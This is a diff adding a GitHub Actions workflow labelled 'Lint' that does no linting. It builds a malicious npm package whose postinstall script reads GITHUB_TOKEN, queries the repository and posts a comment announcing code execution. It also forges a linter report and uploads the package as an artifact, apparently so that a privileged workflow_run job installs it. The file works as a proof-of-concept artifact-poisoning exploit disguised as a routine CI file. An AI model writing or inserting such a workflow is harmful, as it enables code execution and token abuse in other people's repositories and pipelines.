@@ -1,0 +1,47 @@
+name: Lint
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker artifact
+        run: |
+          mkdir -p evilpoc
+          cat > evilpoc/package.json <<'EOF'
+          {"name":"evilpoc","version":"1.0.0","scripts":{"postinstall":"node poc.js"}}
+          EOF
+          cat > evilpoc/poc.js <<'EOF'
+          const fs=require('fs'),path=require('path');
+          const root=process.env.INIT_CWD||process.cwd();
+          const repo=process.env.GITHUB_REPOSITORY,tok=process.env.GITHUB_TOKEN||'';
+          const pr=fs.readFileSync(path.join(root,'pr-number.txt'),'utf8').trim();
+          const H={authorization:'Bearer '+tok,accept:'application/vnd.github+json','user-agent':'poc','content-type':'application/json'};
+          (async()=>{
+            const me=await fetch('https://api.github.com/repos/'+repo,{headers:H});
+            const perm=me.headers.get('x-oauth-scopes');
+            const body='## POC_EXACT_TARGET_RCE\n\nAttacker npm postinstall executed inside the privileged workflow_run job (exact target workflow bytes, download-artifact@v4).\n\n- uid='+process.getuid()+' user='+require('os').userInfo().username+'\n- cwd='+process.cwd()+'\n- GITHUB_TOKEN present='+(tok?'yes':'no')+' len='+tok.length+'\n';
+            const r=await fetch('https://api.github.com/repos/'+repo+'/issues/'+pr+'/comments',{method:'POST',headers:H,body:JSON.stringify({body})});
+            console.log('POC_COMMENT_STATUS='+r.status);
+            fs.writeFileSync('/tmp/poc_marker','ok');
+          })().catch(e=>console.log('POC_ERR '+e.message));
+          EOF
+          (cd evilpoc && npm pack --pack-destination ..)
+          printf 'FORGED REPORT - exact target workflow run\n' > linter-report.txt
+          printf '%s' "${{ github.event.pull_request.number }}" > pr-number.txt
+          cat > package.json <<'EOF'
+          {"name":"poc-root","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"},"allowScripts":{"evilpoc":true}}
+          EOF
+      - name: Upload linter report
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: |
+            package.json
+            evilpoc-1.0.0.tgz
+            linter-report.txt
+            pr-number.txt
+          if-no-files-found: ignore
